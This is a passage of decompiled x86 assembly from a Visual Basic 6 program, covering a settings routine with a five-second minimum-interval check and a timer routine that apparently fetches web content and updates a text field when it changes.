007F6B5C: jnl 7F6B7Eh
007F6B5E: push 00000040h
007F6B60: push 00440DE8h
007F6B65: push var_00000210
007F6B6B: push var_00000214
007F6B71: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6B76: mov var_000005F8, eax
007F6B7C: jmp 7F6B85h
007F6B7E: and var_000005F8, 00000000h
007F6B85: mov eax, var_00000084
007F6B8B: mov var_00000218, eax
007F6B91: lea eax, var_5C
007F6B94: push eax
007F6B95: mov eax, var_00000218
007F6B9B: mov eax, [eax]
007F6B9D: push var_00000218
007F6BA3: call [eax+000000A0h]
007F6BA9: fclex 
007F6BAB: mov var_0000021C, eax
007F6BB1: cmp var_0000021C, 00000000h
007F6BB8: jnl 7F6BDDh
007F6BBA: push 000000A0h
007F6BBF: push 00440E08h
007F6BC4: push var_00000218
007F6BCA: push var_0000021C
007F6BD0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6BD5: mov var_000005FC, eax
007F6BDB: jmp 7F6BE4h
007F6BDD: and var_000005FC, 00000000h
007F6BE4: push var_5C
007F6BE7: call 004109DCh ; Val(arg_1)
007F6BEC: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F6BF1: fcomp real8 ptr [00407140h]
007F6BF7: fstsw ax
007F6BF9: sahf 
007F6BFA: jnb 7F6C08h
007F6BFC: mov var_00000600, 00000001h
007F6C06: jmp 7F6C0Fh
007F6C08: and var_00000600, 00000000h
007F6C0F: mov eax, var_000005E8
007F6C15: neg eax
007F6C17: mov ecx, var_000005F4
007F6C1D: neg ecx
007F6C1F: and ax, cx
007F6C22: mov ecx, var_00000600
007F6C28: neg ecx
007F6C2A: and ax, cx
007F6C2D: mov var_00000220, ax
007F6C34: lea eax, var_5C
007F6C37: push eax
007F6C38: lea eax, var_58
007F6C3B: push eax
007F6C3C: lea eax, var_54
007F6C3F: push eax
007F6C40: push 00000003h
007F6C42: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F6C47: add esp, 00000010h
007F6C4A: lea eax, var_00000084
007F6C50: push eax
007F6C51: lea eax, var_80
007F6C54: push eax
007F6C55: lea eax, var_7C
007F6C58: push eax
007F6C59: lea eax, var_78
007F6C5C: push eax
007F6C5D: lea eax, var_74
007F6C60: push eax
007F6C61: lea eax, var_70
007F6C64: push eax
007F6C65: push 00000006h
007F6C67: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F6C6C: add esp, 0000001Ch
007F6C6F: movsx eax, word ptr var_00000220
007F6C76: test eax, eax
007F6C78: jz 007F6D34h
007F6C7E: mov var_04, 000000C7h
007F6C85: mov var_000000BC, 80020004h
007F6C8F: mov var_000000C4, 0000000Ah
007F6C99: mov var_000000AC, 80020004h
007F6CA3: mov var_000000B4, 0000000Ah
007F6CAD: mov var_0000009C, 80020004h
007F6CB7: mov var_000000A4, 0000000Ah
007F6CC1: mov var_00000150, 00450BDCh ; Minimum time interval is 5 seconds
007F6CCB: mov var_00000158, 00000008h
007F6CD5: lea edx, var_00000158
007F6CDB: lea ecx, var_00000094
007F6CE1: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F6CE6: lea eax, var_000000C4
007F6CEC: push eax
007F6CED: lea eax, var_000000B4
007F6CF3: push eax
007F6CF4: lea eax, var_000000A4
007F6CFA: push eax
007F6CFB: push 00000010h
007F6CFD: lea eax, var_00000094
007F6D03: push eax
007F6D04: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F6D09: lea eax, var_000000C4
007F6D0F: push eax
007F6D10: lea eax, var_000000B4
007F6D16: push eax
007F6D17: lea eax, var_000000A4
007F6D1D: push eax
007F6D1E: lea eax, var_00000094
007F6D24: push eax
007F6D25: push 00000004h
007F6D27: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F6D2C: add esp, 00000014h
007F6D2F: jmp 007F712Eh
007F6D34: mov var_04, 000000CAh
007F6D3B: mov eax, [ebp+08h]
007F6D3E: mov eax, [eax]
007F6D40: push [ebp+08h]
007F6D43: call [eax+00000318h]
007F6D49: push eax
007F6D4A: lea eax, var_70
007F6D4D: push eax
007F6D4E: call 00410A84h ; Set (object)
007F6D53: mov var_000001F0, eax
007F6D59: lea eax, var_74
007F6D5C: push eax
007F6D5D: push 00000000h
007F6D5F: mov eax, var_000001F0
007F6D65: mov eax, [eax]
007F6D67: push var_000001F0
007F6D6D: call [eax+40h]
007F6D70: fclex 
007F6D72: mov var_000001F4, eax
007F6D78: cmp var_000001F4, 00000000h
007F6D7F: jnl 7F6DA1h
007F6D81: push 00000040h
007F6D83: push 00440DE8h
007F6D88: push var_000001F0
007F6D8E: push var_000001F4
007F6D94: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6D99: mov var_00000604, eax
007F6D9F: jmp 7F6DA8h
007F6DA1: and var_00000604, 00000000h
007F6DA8: mov eax, var_74
007F6DAB: mov var_000001F8, eax
007F6DB1: lea eax, var_54
007F6DB4: push eax
007F6DB5: mov eax, var_000001F8
007F6DBB: mov eax, [eax]
007F6DBD: push var_000001F8
007F6DC3: call [eax+000000A0h]
007F6DC9: fclex 
007F6DCB: mov var_000001FC, eax
007F6DD1: cmp var_000001FC, 00000000h
007F6DD8: jnl 7F6DFDh
007F6DDA: push 000000A0h
007F6DDF: push 00440E08h
007F6DE4: push var_000001F8
007F6DEA: push var_000001FC
007F6DF0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6DF5: mov var_00000608, eax
007F6DFB: jmp 7F6E04h
007F6DFD: and var_00000608, 00000000h
007F6E04: push var_54
007F6E07: call 004109DCh ; Val(arg_1)
007F6E0C: fstp real8 ptr var_000001E4
007F6E12: mov eax, [ebp+08h]
007F6E15: mov eax, [eax]
007F6E17: push [ebp+08h]
007F6E1A: call [eax+00000318h]
007F6E20: push eax
007F6E21: lea eax, var_78
007F6E24: push eax
007F6E25: call 00410A84h ; Set (object)
007F6E2A: mov var_00000200, eax
007F6E30: lea eax, var_7C
007F6E33: push eax
007F6E34: push 00000001h
007F6E36: mov eax, var_00000200
007F6E3C: mov eax, [eax]
007F6E3E: push var_00000200
007F6E44: call [eax+40h]
007F6E47: fclex 
007F6E49: mov var_00000204, eax
007F6E4F: cmp var_00000204, 00000000h
007F6E56: jnl 7F6E78h
007F6E58: push 00000040h
007F6E5A: push 00440DE8h
007F6E5F: push var_00000200
007F6E65: push var_00000204
007F6E6B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6E70: mov var_0000060C, eax
007F6E76: jmp 7F6E7Fh
007F6E78: and var_0000060C, 00000000h
007F6E7F: mov eax, var_7C
007F6E82: mov var_00000208, eax
007F6E88: lea eax, var_58
007F6E8B: push eax
007F6E8C: mov eax, var_00000208
007F6E92: mov eax, [eax]
007F6E94: push var_00000208
007F6E9A: call [eax+000000A0h]
007F6EA0: fclex 
007F6EA2: mov var_0000020C, eax
007F6EA8: cmp var_0000020C, 00000000h
007F6EAF: jnl 7F6ED4h
007F6EB1: push 000000A0h
007F6EB6: push 00440E08h
007F6EBB: push var_00000208
007F6EC1: push var_0000020C
007F6EC7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6ECC: mov var_00000610, eax
007F6ED2: jmp 7F6EDBh
007F6ED4: and var_00000610, 00000000h
007F6EDB: push var_58
007F6EDE: call 004109DCh ; Val(arg_1)
007F6EE3: fstp real8 ptr var_000001EC
007F6EE9: mov eax, [ebp+08h]
007F6EEC: mov eax, [eax]
007F6EEE: push [ebp+08h]
007F6EF1: call [eax+00000318h]
007F6EF7: push eax
007F6EF8: lea eax, var_80
007F6EFB: push eax
007F6EFC: call 00410A84h ; Set (object)
007F6F01: mov var_00000210, eax
007F6F07: lea eax, var_00000084
007F6F0D: push eax
007F6F0E: push 00000002h
007F6F10: mov eax, var_00000210
007F6F16: mov eax, [eax]
007F6F18: push var_00000210
007F6F1E: call [eax+40h]
007F6F21: fclex 
007F6F23: mov var_00000214, eax
007F6F29: cmp var_00000214, 00000000h
007F6F30: jnl 7F6F52h
007F6F32: push 00000040h
007F6F34: push 00440DE8h
007F6F39: push var_00000210
007F6F3F: push var_00000214
007F6F45: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6F4A: mov var_00000614, eax
007F6F50: jmp 7F6F59h
007F6F52: and var_00000614, 00000000h
007F6F59: mov eax, var_00000084
007F6F5F: mov var_00000218, eax
007F6F65: lea eax, var_5C
007F6F68: push eax
007F6F69: mov eax, var_00000218
007F6F6F: mov eax, [eax]
007F6F71: push var_00000218
007F6F77: call [eax+000000A0h]
007F6F7D: fclex 
007F6F7F: mov var_0000021C, eax
007F6F85: cmp var_0000021C, 00000000h
007F6F8C: jnl 7F6FB1h
007F6F8E: push 000000A0h
007F6F93: push 00440E08h
007F6F98: push var_00000218
007F6F9E: push var_0000021C
007F6FA4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6FA9: mov var_00000618, eax
007F6FAF: jmp 7F6FB8h
007F6FB1: and var_00000618, 00000000h
007F6FB8: push var_5C
007F6FBB: call 004109DCh ; Val(arg_1)
007F6FC0: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F6FC5: mov var_000001D0, ax
007F6FCC: fld real8 ptr var_000001EC
007F6FD2: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F6FD7: mov var_000001CC, ax
007F6FDE: lea eax, var_000001D0
007F6FE4: push eax
007F6FE5: lea eax, var_000001CC
007F6FEB: push eax
007F6FEC: fld real8 ptr var_000001E4
007F6FF2: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F6FF7: push eax
007F6FF8: call 007A5B24h
007F6FFD: mov ecx, [ebp+08h]
007F7000: mov [ecx+34h], eax
007F7003: lea eax, var_5C
007F7006: push eax
007F7007: lea eax, var_58
007F700A: push eax
007F700B: lea eax, var_54
007F700E: push eax
007F700F: push 00000003h
007F7011: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F7016: add esp, 00000010h
007F7019: lea eax, var_00000084
007F701F: push eax
007F7020: lea eax, var_80
007F7023: push eax
007F7024: lea eax, var_7C
007F7027: push eax
007F7028: lea eax, var_78
007F702B: push eax
007F702C: lea eax, var_74
007F702F: push eax
007F7030: lea eax, var_70
007F7033: push eax
007F7034: push 00000006h
007F7036: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F703B: add esp, 0000001Ch
007F703E: mov var_04, 000000CBh
007F7045: mov eax, [ebp+08h]
007F7048: mov eax, [eax]
007F704A: push [ebp+08h]
007F704D: call [eax+00000314h]
007F7053: push eax
007F7054: lea eax, var_70
007F7057: push eax
007F7058: call 00410A84h ; Set (object)
007F705D: mov var_000001F0, eax
007F7063: push 00000000h
007F7065: mov eax, var_000001F0
007F706B: mov eax, [eax]
007F706D: push var_000001F0
007F7073: call [eax+74h]
007F7076: fclex 
007F7078: mov var_000001F4, eax
007F707E: cmp var_000001F4, 00000000h
007F7085: jnl 7F70A7h
007F7087: push 00000074h
007F7089: push 00447A20h
007F708E: push var_000001F0
007F7094: push var_000001F4
007F709A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F709F: mov var_0000061C, eax
007F70A5: jmp 7F70AEh
007F70A7: and var_0000061C, 00000000h
007F70AE: lea ecx, var_70
007F70B1: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F70B6: mov var_04, 000000CCh
007F70BD: mov eax, [ebp+08h]
007F70C0: mov eax, [eax]
007F70C2: push [ebp+08h]
007F70C5: call [eax+00000314h]
007F70CB: push eax
007F70CC: lea eax, var_70
007F70CF: push eax
007F70D0: call 00410A84h ; Set (object)
007F70D5: mov var_000001F0, eax
007F70DB: push FFFFFFFFh
007F70DD: mov eax, var_000001F0
007F70E3: mov eax, [eax]
007F70E5: push var_000001F0
007F70EB: call [eax+5Ch]
007F70EE: fclex 
007F70F0: mov var_000001F4, eax
007F70F6: cmp var_000001F4, 00000000h
007F70FD: jnl 7F711Fh
007F70FF: push 0000005Ch
007F7101: push 00447A20h
007F7106: push var_000001F0
007F710C: push var_000001F4
007F7112: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F7117: mov var_00000620, eax
007F711D: jmp 7F7126h
007F711F: and var_00000620, 00000000h
007F7126: lea ecx, var_70
007F7129: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F712E: mov var_10, 00000000h
007F7135: wait 
007F7136: push 007F72E6h
007F713B: jmp 007F71F8h
007F7140: lea eax, var_6C
007F7143: push eax
007F7144: lea eax, var_68
007F7147: push eax
007F7148: lea eax, var_64
007F714B: push eax
007F714C: lea eax, var_60
007F714F: push eax
007F7150: lea eax, var_5C
007F7153: push eax
007F7154: lea eax, var_58
007F7157: push eax
007F7158: lea eax, var_54
007F715B: push eax
007F715C: push 00000007h
007F715E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F7163: add esp, 00000020h
007F7166: lea eax, var_00000084
007F716C: push eax
007F716D: lea eax, var_80
007F7170: push eax
007F7171: lea eax, var_7C
007F7174: push eax
007F7175: lea eax, var_78
007F7178: push eax
007F7179: lea eax, var_74
007F717C: push eax
007F717D: lea eax, var_70
007F7180: push eax
007F7181: push 00000006h
007F7183: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F7188: add esp, 0000001Ch
007F718B: lea eax, var_00000144
007F7191: push eax
007F7192: lea eax, var_00000134
007F7198: push eax
007F7199: lea eax, var_00000124
007F719F: push eax
007F71A0: lea eax, var_00000114
007F71A6: push eax
007F71A7: lea eax, var_00000104
007F71AD: push eax
007F71AE: lea eax, var_000000F4
007F71B4: push eax
007F71B5: lea eax, var_000000E4
007F71BB: push eax
007F71BC: lea eax, var_000000D4
007F71C2: push eax
007F71C3: lea eax, var_000000C4
007F71C9: push eax
007F71CA: lea eax, var_000000B4
007F71D0: push eax
007F71D1: lea eax, var_000000A4
007F71D7: push eax
007F71D8: lea eax, var_00000094
007F71DE: push eax
007F71DF: push 0000000Ch
007F71E1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F71E6: add esp, 00000034h
007F71E9: lea eax, var_00000148
007F71EF: push eax
007F71F0: push 00000000h
007F71F2: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
007F71F7: ret 
End Sub

Private sub tmrWeb__7F9415
007F9415: push ebp
007F9416: mov ebp, esp
007F9418: sub esp, 0000000Ch
007F941B: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007F9420: mov eax, fs:[00h]
007F9426: push eax
007F9427: mov fs:[00000000h], esp
007F942E: mov eax, 00000098h
007F9433: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F9438: push ebx
007F9439: push esi
007F943A: push edi
007F943B: mov var_0C, esp
007F943E: mov var_08, 0040A0F0h
007F9445: mov eax, [ebp+08h]
007F9448: and eax, 00000001h
007F944B: mov var_04, eax
007F944E: mov eax, [ebp+08h]
007F9451: and al, FEh
007F9453: mov [ebp+08h], eax
007F9456: mov eax, [ebp+08h]
007F9459: mov eax, [eax]
007F945B: push [ebp+08h]
007F945E: call [eax+04h]
007F9461: mov eax, [ebp+08h]
007F9464: mov eax, [eax]
007F9466: push [ebp+08h]
007F9469: call [eax+00000314h]
007F946F: push eax
007F9470: lea eax, var_28
007F9473: push eax
007F9474: call 00410A84h ; Set (object)
007F9479: mov var_68, eax
007F947C: mov eax, [ebp+08h]
007F947F: mov eax, [eax]
007F9481: push [ebp+08h]
007F9484: call [eax+00000314h]
007F948A: push eax
007F948B: lea eax, var_24
007F948E: push eax
007F948F: call 00410A84h ; Set (object)
007F9494: mov var_60, eax
007F9497: lea eax, var_1C
007F949A: push eax
007F949B: mov eax, var_60
007F949E: mov eax, [eax]
007F94A0: push var_60
007F94A3: call [eax+70h]
007F94A6: fclex 
007F94A8: mov var_64, eax
007F94AB: cmp var_64, 00000000h
007F94AF: jnl 7F94C8h
007F94B1: push 00000070h
007F94B3: push 00447A20h
007F94B8: push var_60
007F94BB: push var_64
007F94BE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F94C3: mov var_7C, eax
007F94C6: jmp 7F94CCh
007F94C8: and var_7C, 00000000h
007F94CC: push var_1C
007F94CF: call 004109DCh ; Val(arg_1)
007F94D4: fadd real8 ptr [00401760h]
007F94DA: fstsw ax
007F94DC: test al, 0Dh
007F94DE: jnz 007F9A47h
007F94E4: push ecx
007F94E5: push ecx
007F94E6: fstp real8 ptr [esp]
007F94E9: call 00410790h ; msvbvm60.dll.__vbaStrR8
007F94EE: mov edx, eax
007F94F0: lea ecx, var_20
007F94F3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F94F8: push eax
007F94F9: mov eax, var_68
007F94FC: mov eax, [eax]
007F94FE: push var_68
007F9501: call [eax+74h]
007F9504: fclex 
007F9506: mov var_6C, eax
007F9509: cmp var_6C, 00000000h
007F950D: jnl 7F9526h
007F950F: push 00000074h
007F9511: push 00447A20h
007F9516: push var_68
007F9519: push var_6C
007F951C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9521: mov var_80, eax
007F9524: jmp 7F952Ah
007F9526: and var_80, 00000000h
007F952A: lea eax, var_20
007F952D: push eax
007F952E: lea eax, var_1C
007F9531: push eax
007F9532: push 00000002h
007F9534: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F9539: add esp, 0000000Ch
007F953C: lea eax, var_28
007F953F: push eax
007F9540: lea eax, var_24
007F9543: push eax
007F9544: push 00000002h
007F9546: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F954B: add esp, 0000000Ch
007F954E: mov eax, [ebp+08h]
007F9551: mov eax, [eax]
007F9553: push [ebp+08h]
007F9556: call [eax+00000314h]
007F955C: push eax
007F955D: lea eax, var_24
007F9560: push eax
007F9561: call 00410A84h ; Set (object)
007F9566: mov var_60, eax
007F9569: lea eax, var_1C
007F956C: push eax
007F956D: mov eax, var_60
007F9570: mov eax, [eax]
007F9572: push var_60
007F9575: call [eax+70h]
007F9578: fclex 
007F957A: mov var_64, eax
007F957D: cmp var_64, 00000000h
007F9581: jnl 7F959Dh
007F9583: push 00000070h
007F9585: push 00447A20h
007F958A: push var_60
007F958D: push var_64
007F9590: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9595: mov var_00000084, eax
007F959B: jmp 7F95A4h
007F959D: and var_00000084, 00000000h
007F95A4: push var_1C
007F95A7: call 004109DCh ; Val(arg_1)
007F95AC: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F95B1: mov eax, [ebp+08h]
007F95B4: fild dword ptr [eax+34h]
007F95B7: fstp real8 ptr var_0000008C
007F95BD: fcomp real8 ptr var_0000008C
007F95C3: fstsw ax
007F95C5: sahf 
007F95C6: jb 7F95D4h
007F95C8: mov var_00000090, 00000001h
007F95D2: jmp 7F95DBh
007F95D4: and var_00000090, 00000000h
007F95DB: mov eax, var_00000090
007F95E1: neg eax
007F95E3: mov var_68, ax
007F95E7: lea ecx, var_1C
007F95EA: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F95EF: lea ecx, var_24
007F95F2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F95F7: movsx eax, word ptr var_68
007F95FB: test eax, eax
007F95FD: jz 007F99E3h
007F9603: mov eax, [ebp+08h]
007F9606: mov eax, [eax]
007F9608: push [ebp+08h]
007F960B: call [eax+0000031Ch]
007F9611: push eax
007F9612: lea eax, var_24
007F9615: push eax
007F9616: call 00410A84h ; Set (object)
007F961B: mov var_60, eax
007F961E: lea eax, var_1C
007F9621: push eax
007F9622: mov eax, var_60
007F9625: mov eax, [eax]
007F9627: push var_60
007F962A: call [eax+000000A0h]
007F9630: fclex 
007F9632: mov var_64, eax
007F9635: cmp var_64, 00000000h
007F9639: jnl 7F9658h
007F963B: push 000000A0h
007F9640: push 00440E08h
007F9645: push var_60
007F9648: push var_64
007F964B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9650: mov var_00000094, eax
007F9656: jmp 7F965Fh
007F9658: and var_00000094, 00000000h
007F965F: mov eax, var_1C
007F9662: mov var_78, eax
007F9665: and var_1C, 00000000h
007F9669: mov eax, var_78
007F966C: mov var_30, eax
007F966F: mov var_38, 00000008h
007F9676: push 00000010h
007F9678: pop eax
007F9679: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F967E: lea esi, var_38
007F9681: mov edi, esp
007F9683: movsd 
007F9684: movsd 
007F9685: movsd 
007F9686: movsd 
007F9687: push 00000001h
007F9689: push 00000011h
007F968B: mov eax, [ebp+08h]
007F968E: mov eax, [eax]
007F9690: push [ebp+08h]
007F9693: call [eax+00000378h]
007F9699: push eax
007F969A: lea eax, var_28
007F969D: push eax
007F969E: call 00410A84h ; Set (object)
007F96A3: push eax
007F96A4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
007F96A9: add esp, 0000001Ch
007F96AC: lea eax, var_28
007F96AF: push eax
007F96B0: lea eax, var_24
007F96B3: push eax
007F96B4: push 00000002h
007F96B6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F96BB: add esp, 0000000Ch
007F96BE: lea ecx, var_38
007F96C1: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F96C6: mov eax, [ebp+08h]
007F96C9: mov eax, [eax]
007F96CB: push [ebp+08h]
007F96CE: call [eax+00000310h]
007F96D4: push eax
007F96D5: lea eax, var_24
007F96D8: push eax
007F96D9: call 00410A84h ; Set (object)
007F96DE: mov var_60, eax
007F96E1: push FFFFFFFFh
007F96E3: mov eax, var_60
007F96E6: mov eax, [eax]
007F96E8: push var_60
007F96EB: call [eax+5Ch]
007F96EE: fclex 
007F96F0: mov var_64, eax
007F96F3: cmp var_64, 00000000h
007F96F7: jnl 7F9713h
007F96F9: push 0000005Ch
007F96FB: push 00447A20h
007F9700: push var_60
007F9703: push var_64
007F9706: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F970B: mov var_00000098, eax
007F9711: jmp 7F971Ah
007F9713: and var_00000098, 00000000h
007F971A: lea ecx, var_24
007F971D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F9722: mov eax, [ebp+08h]
007F9725: mov eax, [eax]
007F9727: push [ebp+08h]
007F972A: call [eax+00000310h]
007F9730: push eax
007F9731: lea eax, var_28
007F9734: push eax
007F9735: call 00410A84h ; Set (object)
007F973A: mov var_60, eax
007F973D: lea eax, var_5C
007F9740: push eax
007F9741: mov eax, var_60
007F9744: mov eax, [eax]
007F9746: push var_60
007F9749: call [eax+58h]
007F974C: fclex 
007F974E: mov var_64, eax
007F9751: cmp var_64, 00000000h
007F9755: jnl 7F9771h
007F9757: push 00000058h
007F9759: push 00447A20h
007F975E: push var_60
007F9761: push var_64
007F9764: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9769: mov var_0000009C, eax
007F976F: jmp 7F9778h
007F9771: and var_0000009C, 00000000h
007F9778: push 00000000h
007F977A: push 00000008h
007F977C: mov eax, [ebp+08h]
007F977F: mov eax, [eax]
007F9781: push [ebp+08h]
007F9784: call [eax+00000378h]
007F978A: push eax
007F978B: lea eax, var_24
007F978E: push eax
007F978F: call 00410A84h ; Set (object)
007F9794: push eax
007F9795: lea eax, var_38
007F9798: push eax
007F9799: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F979E: add esp, 00000010h
007F97A1: push eax
007F97A2: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F97A7: sub ax, FFFFh
007F97AB: neg ax
007F97AE: sbb eax, eax
007F97B0: inc eax
007F97B1: neg eax
007F97B3: xor ecx, ecx
007F97B5: cmp word ptr var_5C, FFFFh
007F97BA: setz cl
007F97BD: neg ecx
007F97BF: and ax, cx
007F97C2: mov var_68, ax
007F97C6: lea eax, var_28
007F97C9: push eax
007F97CA: lea eax, var_24
007F97CD: push eax
007F97CE: push 00000002h
007F97D0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F97D5: add esp, 0000000Ch
007F97D8: lea ecx, var_38
007F97DB: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F97E0: movsx eax, word ptr var_68
007F97E4: test eax, eax
007F97E6: jz 7F97F2h
007F97E8: call 0041096Ah ; DoEvents
007F97ED: jmp 007F9722h
007F97F2: mov var_40, 00001000h
007F97F9: mov var_48, 00000002h
007F9800: push 00000010h
007F9802: pop eax
007F9803: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F9808: lea esi, var_48
007F980B: mov edi, esp
007F980D: movsd 
007F980E: movsd 
007F980F: movsd 
007F9810: movsd 
007F9811: push 00000001h
007F9813: push 00000017h
007F9815: mov eax, [ebp+08h]
007F9818: mov eax, [eax]
007F981A: push [ebp+08h]
007F981D: call [eax+00000378h]
007F9823: push eax
007F9824: lea eax, var_24
007F9827: push eax
007F9828: call 00410A84h ; Set (object)
007F982D: push eax
007F982E: lea eax, var_38
007F9831: push eax
007F9832: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F9837: add esp, 00000020h
007F983A: push eax
007F983B: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F9840: mov edx, eax
007F9842: lea ecx, var_18
007F9845: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F984A: lea ecx, var_24
007F984D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F9852: lea ecx, var_38
007F9855: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F985A: mov eax, [ebp+08h]
007F985D: mov eax, [eax]
007F985F: push [ebp+08h]
007F9862: call [eax+00000344h]
007F9868: push eax
007F9869: lea eax, var_24
007F986C: push eax
007F986D: call 00410A84h ; Set (object)
007F9872: mov var_60, eax
007F9875: lea eax, var_1C
007F9878: push eax
007F9879: mov eax, var_60
007F987C: mov eax, [eax]
007F987E: push var_60
007F9881: call [eax+000000A0h]
007F9887: fclex 
007F9889: mov var_64, eax
007F988C: cmp var_64, 00000000h
007F9890: jnl 7F98AFh
007F9892: push 000000A0h
007F9897: push 00440E08h
007F989C: push var_60
007F989F: push var_64
007F98A2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F98A7: mov var_000000A0, eax
007F98AD: jmp 7F98B6h
007F98AF: and var_000000A0, 00000000h
007F98B6: push var_18
007F98B9: push var_1C
007F98BC: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
007F98C1: neg eax
007F98C3: sbb eax, eax
007F98C5: neg eax
007F98C7: neg eax
007F98C9: mov var_68, ax
007F98CD: lea ecx, var_1C
007F98D0: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F98D5: lea ecx, var_24
007F98D8: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F98DD: movsx eax, word ptr var_68
007F98E1: test eax, eax
007F98E3: jz 007F9987h
007F98E9: mov eax, [ebp+08h]
007F98EC: mov eax, [eax]
007F98EE: push [ebp+08h]
007F98F1: call [eax+00000344h]
007F98F7: push eax
007F98F8: lea eax, var_24
007F98FB: push eax
007F98FC: call 00410A84h ; Set (object)
007F9901: mov var_60, eax
007F9904: push var_18
007F9907: mov eax, var_60
007F990A: mov eax, [eax]
007F990C: push var_60
007F990F: call [eax+000000A4h]
007F9915: fclex 
007F9917: mov var_64, eax
007F991A: cmp var_64, 00000000h
007F991E: jnl 7F993Dh
007F9920: push 000000A4h
007F9925: push 00440E08h
007F992A: push var_60
007F992D: push var_64
007F9930: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9935: mov var_000000A4, eax
007F993B: jmp 7F9944h
007F993D: and var_000000A4, 00000000h
007F9944: lea ecx, var_24
007F9947: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F994C: mov eax, [ebp+08h]
007F994F: mov eax, [eax]
007F9951: push [ebp+08h]
007F9954: call [eax+00000708h]
007F995A: mov var_60, eax
007F995D: cmp var_60, 00000000h
007F9961: jnl 7F9980h
007F9963: push 00000708h
007F9968: push 0044409Ch
007F996D: push [ebp+08h]
007F9970: push var_60
007F9973: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9978: mov var_000000A8, eax
007F997E: jmp 7F9987h
007F9980: and var_000000A8, 00000000h
007F9987: mov eax, [ebp+08h]
007F998A: mov eax, [eax]
007F998C: push [ebp+08h]
007F998F: call [eax+00000314h]
007F9995: push eax
007F9996: lea eax, var_24
007F9999: push eax
007F999A: call 00410A84h ; Set (object)
007F999F: mov var_60, eax
007F99A2: push 00000000h
007F99A4: mov eax, var_60
007F99A7: mov eax, [eax]
007F99A9: push var_60
007F99AC: call [eax+74h]
007F99AF: fclex 
007F99B1: mov var_64, eax
007F99B4: cmp var_64, 00000000h
007F99B8: jnl 7F99D4h
007F99BA: push 00000074h
007F99BC: push 00447A20h
007F99C1: push var_60
007F99C4: push var_64
007F99C7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F99CC: mov var_000000AC, eax
007F99D2: jmp 7F99DBh
007F99D4: and var_000000AC, 00000000h
007F99DB: lea ecx, var_24
007F99DE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F99E3: mov var_04, 00000000h
007F99EA: wait 
007F99EB: push 007F9A28h
007F99F0: jmp 7F9A1Fh
007F99F2: lea eax, var_20
007F99F5: push eax
007F99F6: lea eax, var_1C
007F99F9: push eax
007F99FA: push 00000002h
007F99FC: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F9A01: add esp, 0000000Ch
007F9A04: lea eax, var_28
007F9A07: push eax
007F9A08: lea eax, var_24
007F9A0B: push eax
007F9A0C: push 00000002h
